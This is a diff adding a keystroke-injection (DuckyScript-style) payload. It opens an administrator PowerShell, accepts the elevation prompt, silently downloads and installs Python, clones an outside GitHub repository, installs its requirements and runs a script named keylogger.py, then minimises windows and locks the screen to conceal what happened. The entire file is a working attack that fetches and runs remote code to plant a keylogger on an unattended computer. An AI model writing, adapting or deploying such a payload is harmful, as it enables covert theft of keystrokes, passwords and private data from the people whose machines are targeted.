@@ -1,0 +1,56 @@
+REM opens powershell as admin
+GUI r
+DELAY 1000
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+
+REM INSTALLS PYTHON
+STRING Invoke-WebRequest -UseBasicParsing -Uri 'https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe' -OutFile $env:USERPROFILE\Desktop\python-3.11.0-amd64.exe
+ENTER
+DELAY 20000
+STRING Start-Process -FilePath "$env:USERPROFILE\Desktop\python-3.11.0-amd64.exe" -ArgumentList "/quiet", "InstallAllUsers=1", "PrependPath=1", "Include_test=0" -Wait
+ENTER
+DELAY 5000
+STRING EXIT
+
+REM opens powershell as admin
+GUI r
+DELAY 1000
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+
+REM download and install requirements
+STRING $repositoryUrl = "https://github.com/aerojamie/KLjme.git"
+ENTER
+DELAY 1000
+STRING $destinationFolder = "$env:USERPROFILE\Desktop\KLjme"
+ENTER
+DELAY 1000
+STRING New-Item -ItemType Directory -Force -Path $destinationFolder
+ENTER
+DELAY 1000
+STRING git clone $repositoryUrl $destinationFolder
+ENTER
+DELAY 1000
+STRING cd $destinationFolder
+ENTER
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 1000
+STRING pip install -r requirements.txt
+ENTER
+DELAY 1000
+STRING python keylogger.py
+ENTER
+ENTER
+DELAY 1000
+GUI m
+DELAY 1000
+GUI l
